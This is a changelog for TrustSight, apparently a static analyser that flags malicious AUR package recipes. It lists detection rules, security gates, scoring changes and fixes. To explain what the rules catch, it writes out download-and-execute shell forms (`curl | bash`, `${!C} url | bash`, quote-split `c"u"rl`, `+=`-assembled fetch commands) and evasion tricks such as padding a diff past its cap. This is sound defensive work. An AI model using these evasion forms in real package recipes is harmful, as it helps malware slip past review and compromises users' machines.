# Changelog

## [Unreleased]

### Added

- **A release channel for every baseline.** All baselines the tool consumes
  now ship as signed GitHub release assets with the `baseline-` prefix:
  `baseline-seed.tar.gz` (the hashed novelty seed),
  `baseline-ioc-<source>-<incident>-manifest.json` / `-iocs.jsonl` (per-curator
  IOC baselines), `baseline-corpus.tar.zst` (the corpus baseline) and
  `baseline-manifest.json` (per-asset SHA-256, size and signature). Every
  asset carries a detached Ed25519 `.sig` under the pinned distribution key,
  verified before any payload is read; a download that does not verify is
  refused, never imported. New in the tool: `trustsight seed fetch` (download,
  verify, import), release-channel `ioc update` (per-curator verification
  preserved on top of the distribution signature), first-run auto-import of a
  missing seed from the channel, and `scripts/build_release_baselines.py`
  (build, sign, self-verify, manifest). The
  [`.github/workflows/baselines.yml`](../.github/workflows/baselines.yml)
  workflow builds and uploads the seed, IOC and manifest assets on every
  published release, signing with the `BASELINE_SIGNING_KEY` Actions secret;
  the corpus baseline is exported by the maintainer and uploaded per the
  publishing guide.
- **A security model, stated and enforced.** [`docs/security.md`](security.md)
  is now the canonical page: TrustSight as a program consuming hostile input
  (Part A), what a verdict claims and does not claim (Part B), an enforcement
  map (Part C), and a vulnerability disclosure policy written for a static
  analyser, with supported versions, severity timelines, and an explicit list
  of what is not a vulnerability (Part D).
- **`scripts/security_gates.py` and a CI job.** Forty-five gates, one per
  invariant: no interpreter or shell execution, version arguments
  shape-checked, network confined to the four fetch modules, one declared host,
  every request timed out, bounded rule matching, bounded and never-indirect
  expansion, data-driven rendering, no archive extraction, parameterised SQL,
  inert terminal output, coverage failing closed, a gap always shown with the
  band, FATAL integrity, seed and baseline containment, reserved names refused
  by every writer. The v0.12.0 additions guard the two new subsystems: an IOC
  match always carries its source (A13b), never contributes to the score (B1),
  is reported when expired rather than silently dropped, and never appears in
  the rule config layer; the novelty seed stores no plaintext identity (P1) and
  hashes deterministically. Three gates guard the
  documentation rather than the code: the maturity numbers in B3 must be derived
  from `scoring._MATURITY_THRESHOLD` rather than copied beside it; every link
  between pages under `docs/` must resolve to a file and an anchor that exist;
  and the doc and the gate list must still describe the same set, so a guarantee
  cannot be added to one without the other.
- **Coverage accounting (`src/trustsight/coverage.py`).** Four gaps are now
  first-class on `PackageFact` and in the JSON: `diff_truncated`,
  `line_truncated`, `tree_not_analyzed`, `unresolved_source`. A gap never adds
  points, but it constrains presentation two ways: it forbids an UNFLAGGED
  verdict (the run reports `Inconclusive` unless a HIGH or worse finding already
  stands), **and** it travels with the band wherever a person sees one, so an
  incomplete run renders as `High (incomplete analysis)` rather than `High`.
  That second half closes the decoy seam: pad past the cap, put the payload
  after the cut, and include one cheap deliberate HIGH in the visible prefix.
  Reported as a weight-0 `COVERAGE` entry in the breakdown and quoted in
  `unresolved_sources`. Machine output keeps `risk` bare with `coverage_gaps`
  beside it, plus `risk_label` for consumers that display a band.
- **`src/trustsight/safe_text.py`.** `clean()` and `safe_markup()` strip ANSI
  and OSC sequences, C0/C1 control bytes and DEL, and neutralise Rich markup,
  applied at every render boundary in `cli/`. Stored evidence and JSON output
  stay byte-exact.
- **`PackageFact.risk`.** The verdict band is now carried on the fact and read
  through `scoring.verdict_level()` (bare band, for machines) or
  `scoring.verdict_label()` (qualified, for people).
- **IOC Federation baseline system (v0.12.0, `src/trustsight/ioc_baseline.py`).**
  A signed, multi-curator, time-bounded inventory of known-bad artifacts
  (domains, file hashes, package names) that sits outside the heuristic score.
  Baselines are Ed25519-signed directories (`manifest.json` + `iocs.jsonl`),
  imported per source and replaced idempotently; each match names the curator
  that flagged it (attribution, not aggregation), carries its incident and
  evidence URL, and reports expiry rather than silently lapsing. A new
  `IOC Match` stage runs after rule matching and attaches
  `PackageFact.ioc_matches`; matches never enter `score_breakdown` and never
  move the number. New `[baselines.ioc]` config section, `ioc_entries` table,
  and `trustsight ioc {sources,import,update,list,export}` commands. See
  [the IOC reference](reference/ioc.md).
- **User-data hashing for the novelty seed (v0.12.0).** The bundled seed's
  ~36k maintainer names and emails are stored as salted SHA-256 hashes, not
  plaintext: the novelty and maturity signals need only "have we seen this
  identity before", never the literal string. A per-seed 32-byte salt defeats
  precomputed tables; the salt travels in `seed_meta`. Names and emails are
  normalised (`strip().lower()`) at one hashing chokepoint so the seed build,
  the plaintext-to-hashed migration, and every runtime lookup agree. An old
  plaintext seed is migrated on first run and the original table renamed to
  `maintainers_deprecated_backup`. New `maintainers_hashed` /
  `package_maintainers_hashed` tables and `trustsight seed {info,stats,migrate}`
  commands. Documented in [seed provenance](explanation/seed-provenance.md).
- **Committed-file scanning (`differ.companion_source_hunks`).** A payload that
  ships as a file inside the AUR repo (declared in `source=()` or merely named
  by the recipe, e.g. `bash "${startdir}/helper.sh"`) is now read with the same
  rules as the PKGBUILD. The differ used to feed only `PKGBUILD`, `.SRCINFO`
  and `*.install` to the scanner, so a `curl | bash` moved one file over
  reached no rule; the whole current content of every companion the recipe
  names is scanned, so a payload committed earlier and referenced later is
  still seen. Unreferenced committed files are left alone.
- **Two coverage gaps.** `unresolved_source` now tracks a multi-line
  `source=()` array whose `$(...)` rides a continuation line, not only the
  opener; and `unresolved_parse_time` records a top-level command substitution
  that runs while makepkg *sources* the PKGBUILD for metadata, before any rule
  reads it. Both fail closed to `Inconclusive`.
- **R137 (Fetch Then Execute, CRITICAL).** The split download-then-run form a
  reviewer would read as two innocuous lines: a downloader writes a file and
  the same function later executes it. R001/R002 own the single-line pipe;
  R137 owns the split.

### Changed

- **The novelty seed no longer ships inside the package.** The 20 MB
  `src/trustsight/data/seed.db.gz` is gone from the repo, wheel and package;
  the seed is distributed as the signed `baseline-seed.tar.gz` release asset
  (v2 hashed format). First-run auto-import keeps working by fetching and
  verifying the channel asset (silently skipping on failure or offline), and
  `seed fetch` imports it on demand. The security model's network doctrine
  now names **two declared hosts**: `aur.archlinux.org` everywhere, and
  `github.com` confined to the new fetch module `release.py` (seed fetch,
  `ioc update`, first-run import), with the `network confined to the fetch
  modules` and `one network host, declared` gates updated to match.
- **`trustsight full-aur` is safe by default: no accidental whole-AUR scrape.**
  A missing snapshot used to silently trigger a from-scratch bootstrap that
  fetched every PKGBUILD in the AUR (~120k). That now **refuses** unless
  `--bootstrap` is passed. Every cycle, delta or bootstrap, is capped at
  `[limits] corpus_max_per_cycle` (default 2000) and resumes automatically, so
  a large amount of work advances in bounded, resumable chunks instead of one
  avalanche; a capped cycle does not advance the snapshot, run the corpus
  sweep, or export a half-built corpus until the transition completes.
  `--resume` is now implied (cycles resume on their own) and kept only for
  compatibility. The intended cadence is incremental: run `full-aur`
  periodically so each cycle fetches only the changed packages.
- **`trustsight full-aur` is faster, rate-limited, and shows progress.** The
  corpus build fetched one PKGBUILD per package serially, with feedback only
  every 1000 packages. PKGBUILDs are now fetched a window ahead, several at a
  time (`[limits] corpus_fetch_workers`, default 5); analysis stays serial and
  in package order so novelty still reads earlier packages' observations. The
  fetcher is a good citizen to the AUR's cgit (which rate-limits per IP and
  runs anti-scraping): a global aggregate rate cap (~5 requests/second) bounds
  the request rate regardless of worker count, and requests retry with
  exponential backoff on `429`, `5xx` and connection resets, honouring a
  `Retry-After` header. On an
  interactive terminal the analysis loop renders a live progress bar on stderr
  (current package, `M/N`, elapsed, ETA), and falls back to periodic log lines
  when there is no TTY or under `--json`. Benign per-package snapshot fallbacks
  (a VCS or `-bin` package with no tarball) dropped from a warning per package
  to debug, and a genuinely unfetchable PKGBUILD is counted and reported once.
  A latent `TypeError` on the reserved-name path (`_logger()` called without
  its argument) is fixed.
- **The tokenizer normalises partial quoting.** `c"u"rl` and `ba"sh"` are
  reconstructed to `curl` and `bash` before rules match, the non-empty twin of
  the empty-quote rule, so intra-word quoting no longer hides a literal from
  the resolved-line rules. A standalone quoted argument (a message, a URL, a
  `depends` entry with structure) keeps its quotes, so tokenisation for the
  other rules does not shift.
- **Maintainer identities hash through one chokepoint.** `db._hash_maintainer_value`
  delegates to `seed_build._hash_value`, and both normalise `strip().lower()`,
  so a maintainer whose name or email differs only in case or whitespace is one
  identity rather than a fresh novelty signal every time. The two formulas used
  to be copied in two modules; identical then, they could drift, and a drift
  would silently miss every lookup.

- **Declared verification is no longer credited (B10).** Checksums,
  `validpgpkeys`, GPG signature sources, source pinning and trusted-forge
  hosting were worth up to 25 points of discount. They are now weight-0
  findings in a new `P` namespace (`P001`-`P003`, `P005`-`P007`), reported in
  their own group under the line "TrustSight does not verify these claims. It
  reports that the recipe makes them." `[verification_evidence]` and
  `[pinning_weights]` are removed from the shipped config, so a local
  `config.toml` cannot reintroduce a credit, and `trusted_forge` is 0.

  These are **declared-practice findings**, not benign rules: they do not
  establish that anything is benign, only that the recipe declares a practice.
  Everything TrustSight sees is attacker-declared and TrustSight never fetches,
  so a signal an attacker can assert for free must not be able to lower a score.

  **Measured consequence.** Benign p95 moved 35 to 45 against the 3,246-diff
  corpus, and benign diffs above the 20-point threshold moved 8.9% to 16.3%.
  Separation still holds (benign p95 45 < malicious p5 60) with the margin
  narrowing from 25 to 15. The `control-bin-package-declared-source` fixture
  moved 20 to 35: it remains a control for the delivery rules and is no longer
  one for the threshold. Twenty is left as the published threshold because
  moving it is a calibration decision with its own evidence.

- **`docs/security.md` no longer claims 20 is the benign 95th percentile.** It
  was, before B10; it now sits at the 83.7th. The page states the measured
  distribution instead, and the gate fails if the stale claim returns.

- **Every page describing the subtractive model rewritten**: the scoring
  formula and tier map in `rules.md`, the Tier D tables in `evidence-tiers.md`,
  the "Why verification subtracts" section in `scoring-philosophy.md`, the
  worked examples and breakdown legend in `reading-a-report.md`, plus
  `configuration.md`, `explanation/index.md`, `corpus-and-priors.md`,
  `cold-start-and-maturity.md`, `auditing-before-update.md`,
  `configuring-rules-and-weights.md` and `index.md`. The calibration figures in
  `reading-a-report.md` were re-derived rather than adjusted: zero-rate 74.9% to
  69.1%, benign p95 30 to 45, test count 1,365 to 1,377.

### Added

- **B7, a change summary on every result.** `changes` on `PackageFact` and in
  the JSON, sibling to `findings` and `coverage_gaps`, so "nothing fired" cannot
  read as "nothing happened". Plain strings, no severity, never in
  `triggered_rules`; `.SRCINFO` and `.gitignore` suppressed as always-noisy.
- **B8, findings are checkable.** Content rules carry `file` and `line`; the 40
  rules that legitimately cannot (temporal, maintainer, corpus, longitudinal,
  dependency) declare an evidence class in `findings.NON_CONTENT_RULES` rather
  than omitting the field silently.
- **B9, no output grants permission to skip review.** A denylist over the
  rendering templates, which caught a live violation on its first run: the
  no-findings verdict ended "No risk signals fired." with no direction to
  review, and now reads "No published rule matched. Review the diff before
  building."
- **`scoring.FLAG_THRESHOLD`**, so the 20-point threshold is read rather than
  repeated.

### Fixed

- **Resolved rules lost their line numbers.** Fifteen shipped rules
  (`R001`, `R002`, `R003`, `R008`, `R012`, `R039`-`R045`, `R055`-`R057`)
  match `match_target = "resolved"`, and `apply_rules` looked a finding's
  location up in `line_map` by the finding's position in the compacted
  resolved list - but `line_map` is keyed by raw diff-line index, and the
  resolved list omits assignment lines, so the positions did not line up.
  Every resolved rule fired with no `file`/`line` (or, on a position
  collision, the wrong one). The tokenizer now records the raw diff-line
  index of each resolved string (`tokenize_and_resolve_indexed`), and
  `apply_rules` maps through it; `full_aur` gained the `line_map` it never
  passed. The B8 gate, which caught this in CI, now runs under
  `shipped_config()` so a local `rules.toml` that overrides a rule's
  `match_target` can never mask it again.

- **Three render bugs found by looking at the output, not by a gate.** The
  Score row printed the previous row's caption as the risk band (a `for label,
  value in rows` loop shadowed it); the tool's own `[cyan]` markup printed
  literally in the Rules Triggered rows, because it was passed to
  `Text.assemble`, which does not parse markup; and the declared-practice group
  left a ragged empty column for findings with no line number.

### Added (security model corrections)

- **B1 restated: determinism is algorithmic, not configurational.** "The same
  input always produces the same number" was false, and invited a Part D report
  under the nondeterminism clause: two operators with different `rules.toml` get
  different scores by design. Reports now carry a **`config_fingerprint`**, a
  digest over the effective ruleset, scoring weights, thresholds and active
  overrides, so the claim is checkable. Part D's clause now reads "the same
  input, under the same `config_fingerprint`, producing different numbers".
- **A14, the overarching resource guarantee.** A4 bounds what arrives, A5 what
  is matched, A6 what is expanded; together, no package-controlled input decides
  how much CPU, memory, network or disk this process uses. Every bound is a
  source constant rather than a function of the input, and every bound that
  drops content records a coverage gap, tying the guarantee to B2 so a bound can
  never be used as a quiet skip.
- **B9 inverted from denylist to structural requirement.** A denylist over
  phrasings is a treadmill. Every verdict now ends with a direction to review,
  and the primary gate asserts that the direction is **present** rather than
  that a phrasing is absent. Four of the five verdict paths were ending without
  one (first analysis, first analysis with versions, the FATAL path, and the
  signals path); FATAL now ends "Do not build this package. Inspect the diff and
  report it." The denylist is retained as a secondary check and is now scoped to
  **template text only**, via AST rather than a line regex, so a package named
  `safe-rs` or `clean-arch` cannot trip it. That is A7's separation applied to
  B9: templates are code-owned and checked, fields are package-owned and never
  checked.
- **A3 addendum: cloning executes nothing.** libgit2 runs no hooks on clone and
  TrustSight configures no `clean`, `smudge` or `fsmonitor` filter, the
  git-config paths where a fetch becomes an execution. Documented as a property
  of the library rather than a control this project adds.
- **A10 addendum: sanitisation is not transliteration.** A name built from
  homoglyphs renders as the characters it contains, because rewriting an
  identifier would misrepresent what is installed. Name-level confusability is a
  detection concern, not a rendering one.
- **Baseline import reports its delta** instead of warning on it: "N package(s)
  moved from no-history to warm". A threshold on "novelty dropped across many
  packages" would fire on the success case, since that is a baseline's entire
  function. A13's real defence is the bound on what a baseline may write.

### Fixed (audit pass)

- **`forget --prune` echoed database-stored package names raw.** The A10 gate
  exercised the review, inspect and corpus renders and not `forget`, `history`
  or `list`, so the one surface printing unsanitised names was outside it. Now
  cleaned, and the gate renders six surfaces instead of four.
- **`history` and `list` re-derived the band from the saved score**, so a run
  that `review` reported as `Inconclusive (incomplete analysis)` displayed a
  bare "Low" or "Medium" the next time it was listed, violating B2 on two
  surfaces. `scoring.stored_band()` now reads the band and gaps from the row's
  `fact_json`; rows written before that field existed fall back to the derived
  band and are reported as complete, which is the only honest thing to say
  about them. Band colour keys off the bare word via `display.band_colour()`.
- **The change summary never reported dependency changes.** Dead twice over:
  `fact.dependency_changes` was set by nothing, and `changes.summarise` read a
  `{op: names}` shape while `extract_dependency_changes` returns
  `{field: {added names}}`. Adding `depends=('qt6-svg')` now yields
  `depends: +qt6-svg`.
- **`DECLARED_DEFAULT` was defined and referenced nowhere**, so every declared
  practice rendered every time and B10's documented default-subset behaviour did
  not exist. Now applied: the surprising-by-absence set (`P002`, `P003`, `P005`)
  renders by default with "N more declared practice(s); --verbose to list them",
  and `P` findings no longer duplicate into the Rules Triggered block.
- **The calibration wording overclaimed.** `calibration_gates.py` re-computes
  benign p95 and malicious p5 on every push and nothing else, so the aggregate
  figures are a point-in-time measurement. `security.md` now says so, and
  `fire-rates.md` actually publishes the table it was said to publish.

### Performance

- **Analysis is about 42% faster: 14.9 ms to 8.7 ms per diff**, and a full
  3246-diff corpus scan now completes in 31s. Detection is bit-identical: the
  calibration gates, the campaign fixtures and the whole suite were re-run after
  each change.
  - `tokenizer.resolve_added_lines` is memoised per thread. Twenty call sites in
    `analysis/` asked for the resolved form of the same diff and it was
    recomputed every time, about a third of the cost. Keyed on identity rather
    than equality, because hashing a multi-megabyte diff twenty times to avoid
    computing it twenty times is not a saving.
  - `rules._classify_enclosing_function` is memoised the same way, keyed on
    content because each of its fifteen callers holds its own copy.
  - `config.load_toml` gained `copy_result=False` for the six accessors whose
    callers treat the result as read-only. `load_rules` and `load_config` keep
    the deepcopy: `apply_rules` genuinely assigns to `rule["pattern"]`.
  - Both memos are thread-local. `review` analyses packages in a pool, and a
    shared cache would need its eviction sweep to be atomic with the insert; it
    is not, and a `KeyError` in a worker surfaces as "this package was NOT
    vetted". Five tests pin the properties that make the memos safe: no sharing
    between callers, no confusion between diffs, no leakage across threads, and
    no mutation of the shared config tables.

### Fixed

- **The truncation bypass.** Padding a diff past `max_diff_bytes` and appending
  the payload turned a High into a Low. `diff_truncated` was set, serialised,
  and consumed by nothing but a sentence prepended to the verdict. It is now a
  coverage gap, and `scan_diff` applies the same cap the git path always did.
- **`Inconclusive` was computed and then discarded.** Every CLI path re-derived
  the band with `risk_level(final_score)`, which cannot express it, so the
  downgrade never reached the output.
- **AUR-controlled text reached the terminal raw.** Package names, maintainer
  names, file paths and quoted evidence could clear the screen, forge a
  verdict, recolour a row, or abort the render of a whole review batch with an
  unbalanced Rich tag.
- **A seed could rewrite the database it was merged into.** `import_seed`
  copied `seed.metadata` wholesale with `INSERT OR REPLACE` and overwrote
  `maintainer_counts`. It is now limited to the two keys a seed owns, cannot
  raise a locally learned maintainer count (which would suppress R071/R090),
  and records the imported artifact's SHA-256 and origin.
- **A FATAL rule could be deleted from `rules.toml`.** `override.py` already
  refused to suppress a FATAL *finding*; deleting or downgrading the *rule* was
  unguarded. `config.enforce_fatal_rules()` now re-asserts the shipped FATAL
  set in memory at load, warns, and writes nothing back.
- **The AUR metadata fetch had no timeout and no response cap**, unlike every
  other fetch path. It is on the default `review` path, so it was the one that
  would hang.
- **Rule patterns ran on unbounded lines.** Input is clamped to 8 KiB per
  logical line before matching, which bounds every pattern at once. The clamp
  is itself a truncation seam, so a diff containing an over-length line now
  records the `line_truncated` coverage gap rather than skipping the tail
  silently.
- **`_MAX_EXPANSION_DEPTH` was declared and never applied.** Removed, along
  with a dead helper in `resolve_expansions`. A bound nothing enforces reads
  like a guarantee. The bounds that are real (passes, value length, line
  length, table size, and refusing `${!x}` and `${#x}`) are now stated as
  invariant A6.
- **Config lists became regex.** `hosts.toml` ports and TLDs are now escaped
  before being joined into the R047/R048 patterns.
- **`corpus pivot` read a snapshot from the working directory**, so the answer
  depended on where the command was run and a planted file could steer it. One
  location now, under the config directory.
- **Three more instances of one recurring failure**, now written up in
  [reviewing a security control](contributing/security-review.md): a control
  applied at one of several equivalent call sites, with the gate pointed at a
  covered one.
  - `terminal output is inert` exercised `review`'s renderer only.
    `_inspect_rich` interpolated a rule id raw and leaked escape sequences; the
    gate now renders through four paths and names them in its result, and
    `cli/corpus._render_pivot` was extracted from its command so it could be
    one of them.
  - Four of the five `PackageFact` producers set `coverage_gaps`. The
    first-analysis path declared `tree_analyzed=True` having read no tree at
    all and reported a bare "Low". The new `every result declares its coverage`
    gate walks the AST for every construction, so a sixth producer fails rather
    than shipping a false coverage claim.
  - `pacman -Sl <repo>` had no `--` separator, unlike the `pacman -Q` call
    beside it. The repo name is operator input rather than package input, so
    this is consistency rather than a hole, but the separator is free.
- **The line clamp only covered half the rule engine.** A5 claimed the 8 KiB
  per-line bound applied to every pattern "in a way that no per-pattern audit
  can". It applied to `apply_rules`, which runs the ~30 patterns in
  `rules.toml`, and not to the ~88 patterns emitted from `analysis/`, which
  match the diff text directly. Measured on one 5 MiB line: 0.17s through
  `apply_rules`, 15.06s through the code-emitted rules, an attacker-chosen
  multiplier on review time bounded only by `max_diff_bytes`. `rules.clamp_text`
  now clamps the text handed to the code rules at all three call sites,
  shortening lines without dropping them so line numbers stay aligned. Same
  input is now 0.54s end to end, with `line_truncated` still recorded. The gate
  was measuring `apply_rules` alone, which is why it reported the property as
  held; it now measures `scan_diff` end to end and asserts the gap is recorded,
  so bounding the work cannot silently bound the evidence.
- **The reserved-name guard covered one writer of three.** `upsert_package`
  refuses `__seed__` and any `__`-prefixed name; `save_package_profile` and
  `save_pkgbuild_snapshot` did not, and both are on the `import_baseline` path.
  AUR names may begin with an underscore, so `__seed__` is registrable. No leak
  into user-facing queries was reachable (those filter the sentinel), so this
  was a latent inconsistency rather than a demonstrated exploit. All three
  writers now refuse, `db.is_reserved_name` lets corpus callers skip instead of
  raising, and the baseline importer treats a rejected row like a nameless one:
  logged and skipped, never fatal to the import.
- **A heading rename could silently break every link to it.** Renaming a
  section leaves every sentence on the page true and quietly disconnects the
  claims that pointed at it, with nothing failing anywhere: the documentation
  form of skipping content without recording a coverage gap. It nearly happened
  when B2 was reworded. The `doc cross-references resolve` gate now walks every
  `docs/**` link, resolves the file and the anchor, and fails the build on a
  dangling one. Inline code and fenced blocks are excluded, since a rule
  pattern such as `(?<![^\x00-\x7F])[...]` contains `](...)` and is not a link.
- **Two `--help` tests asserted on styled bytes.** Rich renders an option's
  leading hyphen as its own span, so the literal `--repo` is not in the output
  even though the flag is there, and which spans Rich splits moves between
  versions. The assertions now strip styling with the project's own
  `safe_text.clean`, which makes them width- and version-independent and
  exercises the sanitiser at the same time.
- **`differ.map_diff_lines` corrupted filenames.** `lstrip("b/")` strips
  characters, not a prefix, so `+++ b/build.sh` reported findings against
  `uild.sh`.

### Changed

- **`docs/contributing/security-review.md`**, a new page: how to scope a gate so
  it covers the entry point an attacker reaches, the four times this project got
  it wrong, and a table of which gates enumerate the whole source and which
  sample a single path.
- **Punctuation normalised across the docs** to `: ; , () -`, with no em dashes,
  en dashes or spaced `--` anywhere. Pinned by `test_docs_use_standard_punctuation`,
  because it had drifted back three times.
- **`docs/security.md` reorganised around a thesis.** The page now opens with
  the position it is defending (TrustSight is the instrument panel, not the
  airworthiness certificate; a sensor that was never wired must not read the
  same as a sensor reporting zero) and the evidence taxonomy that follows from
  it, before the four parts that make it enforceable. The operative claim
  is that the tool must never move between taxonomy rows silently, which is
  what Part B's coverage rules and Part C's gates exist to prevent.
- **`--watch` is described in Part A.** A watch loop changes the volume of
  fetching, not its shape: per-request bounds still apply, plus an interval
  floor and an optional cycle count. The absence of any hook or notification
  command is now stated explicitly, along with the boundary such a hook would
  need if one is ever added, since it would receive attacker-influenced JSON.
- **`docs/security.md` states its assumptions.** The trust boundary is now
  explicit and complete: the Python runtime, the operating system, local
  filesystem permissions, the TLS trust store, CI, and the tool's dependencies
  (`rich`, `pygit2`, `typer`, `tldextract`, SQLite, `libc`) are all trusted
  rather than defended. If any of them is compromised, the page states, the
  model no longer applies. What was implicit is now the border.
- **Rendering has no model in it, and that is now a stated invariant.** Verdict
  text is a template keyed by rule id filled with named evidence fields;
  values are substituted, never re-expanded or evaluated, and no template comes
  from package-controlled text. The output path therefore has no network
  dependency, no nondeterminism, and no prompt-injection surface. R012 still
  detects injection aimed at whoever reads the diff.
- **Maturity numbers made exact across the docs.** `_MATURITY_THRESHOLD` is 50,
  so the Inconclusive gate at `maturity < 0.5` means fewer than 25 recorded
  analyses. Pages variously said "50 observations" or "approximately 25"; they
  now say both numbers and how they relate.
- **Documented claims corrected to match the code.** The `source_resolution`
  field named in four pages never existed; "no external API is involved" was
  false (four AUR endpoints, now stated precisely); the Inconclusive predicate
  was documented as stricter than it is; R122 is documented as having no call
  site rather than implying corpus-side coverage it does not have; the exit
  code table claimed a flag-driven exit that was never implemented, and
  `docs/guides/using-in-ci.md` gated on a JSON shape `review --json` does not
  emit.
- **The exit-code contract is now enforced, not just documented.** An
  operational failure exits 2 everywhere: `cli/main()` wraps the app so an
  uncaught failure exits 2 with a message on stderr, and the remaining
  operational `Exit(1)` sites (review discovery, inspect not-found, forget
  prune/abort, override add/remove, db check, lint-rules) now exit 2. Exit 1
  is no longer used by any command; a verdict still never changes the exit
  code.

### Added

- **R132: a command or shell named through `${!name}` indirection.**
  `C=curl; ${!C} url | bash` runs curl while the recipe carries no literal
  curl and no literal shell for R001/R002/R129/R121 to name, because the
  tokenizer refuses to evaluate indirection it cannot know statically.
  Flagging the indirection itself (CRITICAL, obfuscation, staged
  `anti_analysis`) closes that whole family; the benign `${!arr[@]}` and
  `${!prefix*}` key-and-name-listing forms are excluded by construction.
- **The evasion fixture corpus (`scripts/gen_evasion_fixtures.py`).** Recipe
  shapes that bypass the engine are written down *before* they are closed and
  kept as the record of what the engine can and cannot yet see. Six original
  evasions (indirect expansion, `+=`-accumulated commands and deps,
  heredoc-fed and heredoc-written recipes), of which five are now detected
  and relabelled into the recall corpus, plus three new open gaps filed for
  the rules that will close them: R133 (array-subscript routing), R134
  (nameref routing) and R135 (command-substitution spelling). Each fixture
  enforces its state in both directions: an open gap must fail its label,
  a relabelled fixture must pass it, so a patch that closes a gap turns
  `gate_known_gaps_unchanged` red instead of leaving a stale record.

### Changed

- **The source-bucket prior scores at its worst URL, not its sum.** Each
  added URL contributed its bucket modifier individually, so appending the
  same suspiciously hosted URL many times (the `discord_arch_electron`
  case: ~26 entries at +20 each) stacked into CRITICAL on the strength of a
  single weak fact. The prior is now the maximum modifier over all added
  URLs: one diff whose provenance is unknown, not thirty separate facts,
  which restores the calibration separation (benign p95 strictly below
  malicious p5). `homograph_attack` still dominates at +30, and trusted
  forges still contribute nothing.
- **The assignment resolver accumulates `+=`.** `_ASSIGNMENT_RE` now reads
  the operator: `=` is a fresh binding, `+=` appends to the current value
  (a fresh name starts empty, matching bash). A fetch command assembled
  across `C+=curl` / `C+=' https://…'` lines therefore resolves to a
  literal `curl https://… | bash` that R001 owns, instead of staying an
  opaque `$C` the literal-matching rules step over.
- **The synthetic fixtures now validate under the shipped config before
  writing.** `scripts/gen_malicious_fixtures.py` resolves labels against the
  same cold-DB, `shipped_config()` context `scan_malicious` runs in, so a
  rule that stops detecting fails at generation time, and a fixture whose
  label was hand-reconciled (R004/R009/R025/R026/R027/R039/R059/R128/R129/R130)
  can no longer be silently clobbered by a regenerate.

### Fixed

- **`depends+=` was invisible to the dependency rules.** Accumulated
  dependency declarations were never parsed as declarations, so a recipe
  that appended to `depends` cold showed no finding at all. The generator
  now keeps `evasion-depends-via-plus-eq` filed as an open gap (novelty
  rules are DB-backed and silent under the gates' cold DB) rather than
  pretending the parse gap is closed.

## [0.11.0] - 2026-07-30

### Added

- **`inspect` output redesigned.** Single Panel with "Rules Triggered" header, Score/Risk at bottom, `--score`/`--risk` independent flags.
- **`review` `--risk` flag.** Coloured border by risk level and Risk row.
- **Dedicated "Files changed" section** in both review and inspect, showing each file with `+`/`~`/`-` prefix.
- **`override wizard <package>`** command. Interactive rule suppression per package.
- **R081 (foreign package manager in install hooks) and R082 (shell obfuscation density ≥3 patterns) graduated from experimental** to enabled by default. Zero false positives on a 3243-diff benign corpus.

### Changed

- **`src/trustsight/analysis.py` (1080 lines) refactored** into `analysis/` package: `base.py`, `build.py`, `dependencies.py`, `maintainer.py`, `pipeline.py`, `structural.py`, `temporal.py`.
- **`src/trustsight/cli.py` (2035 lines) refactored** into `cli/` package: `admin.py`, `app.py`, `display.py`, `forget.py`, `history.py`, `inspect.py`, `list_cmd.py`, `review.py`.
- **`python-cryptography` promoted** from optdepends to hard dependency (resolves namcap warnings about uninstalled `cryptography` module at runtime).
- **`packaging/aur/README.md`** corrected: `python-tldextract` is in the `extra` repository, not the AUR.

### Fixed

- **`fetch_metadata(on_progress=...)` signature mismatch.** The `review` command passed an `on_progress` callback to `fetch_metadata()` but the function did not accept it, crashing with `TypeError` when the metadata-dump download path was taken. Added the `on_progress` parameter to `fetch_metadata()`.
- **Nested parameter expansions** in PKGBUILD variables now resolve correctly via brace-depth tracking.
- **`__seed__` sentinel** excluded from user-facing database queries. Unanalyzed packages show `-` instead of stale seed-derived scores.
- **Version display** contract enforced: `None` shows as `-`, unresolvable strings as `"unresolved"`, across all CLI output paths.
- **Conftest fixture conflict** resolved.

## [0.10.0] - 2026-07-29

### Added

- **Regression tests** for metadata-dispatch bugs (first-run sentinel, repo
  warnings in metadata path, cross-referencing repos, deduplication).
  7 new tests in `tests/test_cli.py`.
- **`optdepends`** for `python-cryptography` and `pyalpm` in
  `packaging/aur/PKGBUILD`.
- **Line mapping for findings.** `map_diff_lines()` maps diff line indices to
  file names and line numbers.  Findings from `apply_rules()` now carry
  `file`/`line` context propagated through `ScoreEntry` and `PackageFact`.
- **Per-file change tracking.** `DiffSummary.file_changes` lists every changed
  file with its status (`added`/`removed`/`modified`), excluding `.SRCINFO`
  and `.gitignore`.
- **Corpus analysis adapter.** `analyze_package_text()` analyzes raw old/new
  PKGBUILD text via `difflib.unified_diff`, enabling the full-AUR corpus
  pipeline (no git repository required).

### Changed

- **`get_installed_from_repo()`** rewired from `pacman -Q --repo` (which
  missed packages not tracked as repo-origin) to `pacman -Sl <repo>` +
  `pacman -Q`.  The old approach only found packages whose `pacman -Q` shows
  an explicit repository name; the new one lists the repo's contents via
  `-Sl` and cross-references with `-Q`.
- **Discovery for `review`** replaced AUR RPC calls with the local
  metadata-dump snapshot (`full-aur-meta.json`, from `full_aur/metadata.py`).
  Installed versions are compared against snapshot versions via `vercmp`
  instead of per-package AUR RPC `info` queries. Falls back to the RPC on
  failure.
- **Repo warnings** split into two distinct messages: `repo 'X' does not
  exist` (when `pacman -Sl` fails) and `repo 'X' exists but no packages from
  it are installed` (when the repo exists but `-Q` finds nothing).
- **`_get_installed_packages()`** now correctly cross-references repo
  packages and foreign packages, respecting `--repo`, `--foreign`, and
  `--all-repos` flags.  Previous implementation only collected foreign
  packages when a repo was specified.
- **First-run sentinel.** `_discover_packages()` returns `(None, 0)` on the
  first metadata fetch so that `review()` does not emit a duplicate
  "No outdated packages found" message.
- **Python >=3.11 required.** `requires-python` bumped from `>=3.10` to
  `>=3.11`. The `tomli` compat shim (`src/trustsight/_toml.py`) and its
  conditional dependency in `pyproject.toml` are removed. All imports use
  stdlib `tomllib`.
- **CI matrix** drops Python 3.10.


### Fixed

- **All 3 namcap warnings** resolved by removing the `tomli` dependency and
  adding `optdepends`.

### Removed

- **`watch` command.** Removed in favour of running `trustsight baseline
  build` via cron. The `baseline build` command already handles incremental
  updates (diff + process changed) when a prior metadata snapshot exists.
  Use `--json` for machine-parseable cron output.
- **`src/trustsight/_toml.py`** removed along with the `tomli` fallback for
  Python 3.10.

## [0.10.1] - 2026-07-29

### Added

- **`forget` command.** `trustsight forget <package>...` removes packages from
  the local database. Supports `--prune` (remove packages not in the AUR),
  `--dry-run` (preview without deleting), and `--yes` (skip confirmation).
  Cascading deletes across 7 database tables. Documented in
